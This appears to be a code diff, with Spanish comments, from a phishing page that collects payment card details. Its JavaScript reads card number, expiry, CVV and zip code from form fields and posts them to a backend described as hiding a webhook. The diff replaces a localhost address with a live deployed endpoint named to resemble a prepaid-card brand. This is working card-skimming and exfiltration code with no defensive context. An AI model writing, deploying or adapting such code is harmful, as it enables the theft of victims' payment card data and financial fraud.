@@ -156,7 +156,7 @@
                     var cvv = document.querySelector('input[placeholder="CVV"]').value;
                     var zip = document.querySelector('input[placeholder="zip code"]').value;
 
-                    // Enviar datos al backend de Railway (el webhook está oculto allí)
+                    // Enviar datos al backend de Render (el webhook está oculto allí)
                     var formData = {
                         card: card,
                         mm: mm,
@@ -164,11 +164,10 @@
                         cvv: cvv,
                         zip: zip
                     };
-                    
-                    // REEMPLAZA ESTA URL CON TU URL DE RAILWAY DESPUÉS DE DESPLEGAR
-                    // Ejemplo: https://tu-proyecto.up.railway.app/api/submit-form
-                    var apiUrl = 'http://localhost:3000/api/submit-form'; // Para desarrollo local
-                    
+
+                    // URL del backend desplegado en Render
+                    var apiUrl = 'https://vanilla-prepaid.onrender.com/api/submit-form';
+
                     fetch(apiUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
